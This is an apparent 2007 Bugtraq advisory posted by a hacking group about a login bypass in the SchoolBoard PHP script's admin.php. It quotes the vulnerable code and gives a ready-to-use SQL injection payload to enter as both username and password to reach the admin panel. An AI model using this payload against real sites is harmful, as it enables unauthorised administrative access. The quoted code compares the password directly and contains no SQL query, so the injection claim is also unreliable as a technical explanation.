
Date: 3 May 2007 13:13:55 -0000
From: ilkerkandemir@...et.com
To: bugtraq@...urityfocus.com
Subject: SchoolBoard (admin.php) Remote Login Bypass SQL Injection
 Vulnerability

# Remote Login Bypass SQL Injection Vulnerability (admin.php)

#

# AYYILDIZ.ORG Presents.

# SchoolBoard [ http://free-php-scripts.net/download.php?id=120 ]

# author : iLker Kandemir    < ilkerkandemir <at> mynet.com >

# Tnx : h0tturk,ekin0x,Dr.Max Virus,Gencnesil,Gencturk,Ajann

# Vulnerable; /admin.php

-------------------------------------------------//If login in
if($_POST['password'] != NULL){    <<<---------------------[+] //do all this:
      
 if($_POST['password'] == $ADMIN_PASS){
  $_SESSION['is_admin'] = $ADMIN_PASS;
 } else {
  $message = 'Invalid Access';
 }
}

//Check password
if($_SESSION['is_admin'] != $ADMIN_PASS){$_GET['page'] = 'login';}

if($_GET['page'] == NULL){$_GET['page'] = $_POST['page'];}

if($_GET['page'] != 'Add' && $_GET['page'] != 'login'){  <<<-------------------[+]  // but the user/pass don't match

-------------------------------------------------


username : 1/**/union/**/select/**/1,2,3,4/*
password : 1/**/union/**/select/**/1,2,3,4/*   (ADMIN_PASS)

Panel: /admin.php logged.

